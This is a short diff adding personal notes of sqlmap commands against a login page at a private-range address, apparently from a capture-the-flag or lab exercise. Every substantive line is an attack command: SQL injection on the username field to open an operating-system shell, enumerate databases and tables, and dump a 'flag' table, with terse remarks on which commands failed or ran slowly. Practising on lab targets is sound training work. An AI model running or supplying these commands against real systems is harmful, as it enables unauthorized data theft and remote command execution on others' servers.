@@ -1,0 +1,11 @@
+sqlmap -u http://10.10.90.254/blood/auth.php --data "username=admin&password=dasdasdas"  -p username --method POST --os-shell
+
+sqlmap -r /root/Desktop/sqli.raw -p username --dbs (don't work for me, something is wrong in request)
+
+sqlmap -u http://10.10.90.254/blood/auth.php --data "username=admin&password=dasdasdas"  -p username --method POST -a (very slow, take a long time, avoid use this)
+
+sqlmap -u http://10.10.90.254/blood/auth.php --data "username=admin&password=dasdasdas"  -p username --method POST --dbs (disconvery
+
+sqlmap -u http://10.10.90.254/blood/auth.php --data "username=admin&password=dasdasdas"  -p username --method POST -D blood --tables 
+
+sqlmap -u http://10.10.90.254/blood/auth.php --data "username=admin&password=dasdasdas"  -p username --method POST -D blood -T flag --dump
